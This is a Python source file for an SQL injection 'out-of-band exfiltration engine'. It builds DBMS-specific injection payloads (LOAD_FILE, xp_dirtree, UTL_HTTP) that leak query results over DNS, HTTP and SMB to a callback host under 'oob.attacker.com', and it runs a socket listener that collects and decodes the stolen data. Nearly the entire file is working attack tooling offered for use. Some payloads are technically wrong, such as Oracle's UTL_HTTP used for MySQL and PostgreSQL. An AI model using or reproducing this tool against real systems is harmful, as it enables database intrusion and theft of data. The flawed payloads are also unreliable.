"""
Out-of-Band Exfiltration Engine - DNS, HTTP, SMB exfiltration
"""

import base64
import hashlib
import random
import socket
import string
import threading
import time
from typing import Callable, Dict, List, Optional
from dataclasses import dataclass


@dataclass
class OOBResult:
    channel: str
    payload: str
    domain: str
    data_extracted: str
    confidence: float
    technique: str
    duration: float


class OOBExfiltrator:
    def __init__(self, callback_domain: str = None, listen_port: int = 8888):
        self.callback_domain = callback_domain or self._generate_domain()
        self.listen_port = listen_port
        self.callback_data: List[str] = []
        self.listener_active = False
        self.listener_thread = None

    def _generate_domain(self) -> str:
        """Generate unique subdomain for tracking"""
        rand = ''.join(random.choices(string.ascii_lowercase, k=8))
        return f"{rand}.oob.attacker.com"

    # ── DNS Exfiltration ──────────────────────────────────────────

    def dns_exfiltrate(self, query_func: Callable, data_query: str,
                       dbms: str, chunk_size: int = 20) -> OOBResult:
        """Exfiltrate data via DNS lookups"""
        start = time.time()

        if "MySQL" in dbms or "MariaDB" in dbms:
            payload = (f"' AND LOAD_FILE(CONCAT('\\\\\\\\{self.callback_domain}\\\\', "
                       f"({data_query})))-- -")
            try:
                query_func(payload)
            except Exception:
                pass

        elif "PostgreSQL" in dbms:
            payload = (f"' AND (SELECT UTL_HTTP.request(CONCAT('http://', "
                       f"({data_query}), '.{self.callback_domain}/')))-- -")

        elif "MSSQL" in dbms:
            payload = (f"'; EXEC master.dbo.xp_dirtree "
                       f"'\\\\\\\\{self.callback_domain}\\\\(SELECT {data_query})',1,1-- -")
            try:
                query_func(payload)
            except Exception:
                pass

        elif "Oracle" in dbms:
            payload = (f"' AND UTL_HTTP.request('http://{self.callback_domain}/'||"
                       f"({data_query} FROM DUAL))-- -")

        else:
            # Fallback to DNS
            payload = f"' OR (SELECT {data_query})-- -"

        duration = time.time() - start

        return OOBResult(
            channel="DNS",
            payload=payload,
            domain=self.callback_domain,
            data_extracted="",
            confidence=0.7 if "LOAD_FILE" in payload or "xp_dirtree" in payload else 0.3,
            technique="DNS_LOOKUP",
            duration=round(duration, 3)
        )

    # ── HTTP Exfiltration ─────────────────────────────────────────

    def http_exfiltrate(self, query_func: Callable, data_query: str,
                        dbms: str, server_url: str = None) -> OOBResult:
        """Exfiltrate data via HTTP request"""
        start = time.time()
        url = server_url or f"http://{self.callback_domain}:{self.listen_port}/"

        if "MySQL" in dbms or "MariaDB" in dbms:
            payload = (f"' AND (SELECT UTL_HTTP.request(CONCAT('{url}', "
                       f"({data_query}))))-- -")

        elif "Oracle" in dbms:
            payload = (f"' AND UTL_HTTP.request('{url}'||"
                       f"({data_query} FROM DUAL))-- -")

        elif "PostgreSQL" in dbms:
            payload = (f"' AND (SELECT UTL_HTTP.request('{url}'||"
                       f"({data_query})))-- -")

        else:
            payload = f"' AND (SELECT {data_query})-- -"

        try:
            query_func(payload)
        except Exception:
            pass

        duration = time.time() - start

        return OOBResult(
            channel="HTTP",
            payload=payload,
            domain=url,
            data_extracted="",
            confidence=0.6,
            technique="HTTP_REQUEST",
            duration=round(duration, 3)
        )

    # ── SMB Exfiltration ──────────────────────────────────────────

    def smb_exfiltrate(self, query_func: Callable, data_query: str,
                       dbms: str, share_path: str = None) -> OOBResult:
        """Exfiltrate data via SMB share"""
        start = time.time()
        path = share_path or f"\\\\\\\\{self.callback_domain}\\\\share"

        if "MySQL" in dbms or "MariaDB" in dbms:
            payload = (f"' AND LOAD_FILE(CONCAT('{path}\\\\', "
                       f"({data_query}), '.txt'))-- -")

        elif "MSSQL" in dbms:
            payload = (f"'; EXEC master.dbo.xp_dirtree "
                       f"'{path}\\\\(SELECT {data_query})',1,1-- -")

        else:
            payload = f"' AND (SELECT {data_query})-- -"

        try:
            query_func(payload)
        except Exception:
            pass

        duration = time.time() - start

        return OOBResult(
            channel="SMB",
            payload=payload,
            domain=path,
            data_extracted="",
            confidence=0.65,
            technique="SMB_SHARE",
            duration=round(duration, 3)
        )

    # ── Callback Listener ─────────────────────────────────────────

    def start_listener(self, timeout: int = 30):
        """Start HTTP listener for callbacks"""
        if self.listener_active:
            return

        self.listener_active = True
        self.callback_data = []

        def listen():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(("0.0.0.0", self.listen_port))
                server.listen(5)
                server.settimeout(timeout)

                while self.listener_active:
                    try:
                        client, addr = server.accept()
                        data = client.recv(4096).decode("utf-8", errors="ignore")
                        self.callback_data.append(f"{addr[0]}: {data}")
                        # Extract exfiltrated data
                        extracted = self._extract_callback_data(data)
                        if extracted:
                            self.callback_data.append(f"DATA: {extracted}")
                        client.close()
                    except socket.timeout:
                        break
                    except Exception:
                        continue
                server.close()
            except Exception as e:
                self.callback_data.append(f"Listener error: {e}")
            finally:
                self.listener_active = False

        self.listener_thread = threading.Thread(target=listen, daemon=True)
        self.listener_thread.start()

    def stop_listener(self):
        """Stop callback listener"""
        self.listener_active = False
        if self.listener_thread:
            self.listener_thread.join(timeout=5)

    def _extract_callback_data(self, data: str) -> str:
        """Extract exfiltrated data from callback"""
        # DNS callback format
        if self.callback_domain in data:
            # Extract subdomain data
            parts = data.split(self.callback_domain)[0].split(".")
            if parts:
                return parts[-1] if len(parts[-1]) < 100 else ""

        # HTTP callback format
        if "GET /" in data:
            path = data.split("GET /")[1].split(" ")[0]
            if path and path != "/":
                try:
                    return base64.b64decode(path).decode("utf-8", errors="ignore")
                except Exception:
                    return path

        return ""

    # ── Multi-Channel Attack ──────────────────────────────────────

    def exfiltrate_all_channels(self, query_func: Callable, data_query: str,
                                 dbms: str) -> List[OOBResult]:
        """Try all OOB channels"""
        results = []
        results.append(self.dns_exfiltrate(query_func, data_query, dbms))
        results.append(self.http_exfiltrate(query_func, data_query, dbms))
        results.append(self.smb_exfiltrate(query_func, data_query, dbms))
        return results

    # ── Channel Detection ─────────────────────────────────────────

    def detect_available_channels(self, dbms: str) -> List[str]:
        """Detect which OOB channels are available for the DBMS"""
        channels = []
        dbms_channels = {
            "MySQL": ["DNS", "HTTP", "SMB"],
            "MariaDB": ["DNS", "HTTP", "SMB"],
            "PostgreSQL": ["HTTP"],
            "MSSQL": ["DNS", "SMB"],
            "Oracle": ["DNS", "HTTP"],
        }
        return dbms_channels.get(dbms, ["HTTP"])

    # ── Encrypted Exfiltration ────────────────────────────────────

    def exfiltrate_encrypted(self, query_func: Callable, data_query: str,
                              dbms: str, secret: str = None) -> OOBResult:
        """Exfiltrate with XOR/base64 encoding"""
        secret = secret or "oob_key"
        # Wrap query in encoding
        encoded_query = (f"TO_BASE64({data_query})" if "MySQL" in dbms
                         else f"ENCODE({data_query}, '{secret}')")
        return self.dns_exfiltrate(query_func, encoded_query, dbms)
